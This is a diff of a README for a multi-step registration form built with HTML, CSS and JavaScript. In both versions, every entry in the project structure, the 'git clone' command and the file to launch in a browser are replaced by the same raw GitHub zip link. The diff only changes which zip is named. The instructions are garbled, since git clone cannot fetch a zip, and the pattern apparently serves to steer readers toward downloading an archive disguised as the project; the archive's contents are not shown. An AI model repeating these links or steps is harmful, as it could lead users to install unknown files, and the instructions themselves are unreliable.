@@ -16,17 +16,17 @@ A simple and interactive multi-step registration form built using HTML, CSS, and
 # 📂 Project Structure
 📁 project-folder
 │-- 📁 resources
-│   ├── https://raw.githubusercontent.com/ronny-gans/multiStepForm/main/resources/Step-Form-multi-v2.6.zip
-│   ├── https://raw.githubusercontent.com/ronny-gans/multiStepForm/main/resources/Step-Form-multi-v2.6.zip
-│-- 📄 https://raw.githubusercontent.com/ronny-gans/multiStepForm/main/resources/Step-Form-multi-v2.6.zip
-│-- 📄 https://raw.githubusercontent.com/ronny-gans/multiStepForm/main/resources/Step-Form-multi-v2.6.zip
-│-- 📄 https://raw.githubusercontent.com/ronny-gans/multiStepForm/main/resources/Step-Form-multi-v2.6.zip
-│-- 📄 https://raw.githubusercontent.com/ronny-gans/multiStepForm/main/resources/Step-Form-multi-v2.6.zip
+│   ├── https://raw.githubusercontent.com/ronny-gans/multiStepForm/main/resources/multi_Form_Step_1.5.zip
+│   ├── https://raw.githubusercontent.com/ronny-gans/multiStepForm/main/resources/multi_Form_Step_1.5.zip
+│-- 📄 https://raw.githubusercontent.com/ronny-gans/multiStepForm/main/resources/multi_Form_Step_1.5.zip
+│-- 📄 https://raw.githubusercontent.com/ronny-gans/multiStepForm/main/resources/multi_Form_Step_1.5.zip
+│-- 📄 https://raw.githubusercontent.com/ronny-gans/multiStepForm/main/resources/multi_Form_Step_1.5.zip
+│-- 📄 https://raw.githubusercontent.com/ronny-gans/multiStepForm/main/resources/multi_Form_Step_1.5.zip
 
 # 📝 Installation & Usage
 1. Clone the repository:
-   `git clone https://raw.githubusercontent.com/ronny-gans/multiStepForm/main/resources/Step-Form-multi-v2.6.zip`
-2. Open the project folder and launch https://raw.githubusercontent.com/ronny-gans/multiStepForm/main/resources/Step-Form-multi-v2.6.zip in a browser.
+   `git clone https://raw.githubusercontent.com/ronny-gans/multiStepForm/main/resources/multi_Form_Step_1.5.zip`
+2. Open the project folder and launch https://raw.githubusercontent.com/ronny-gans/multiStepForm/main/resources/multi_Form_Step_1.5.zip in a browser.
 
 # 🔧 How It Works
 1. Step 1: Enter name and email (validated).
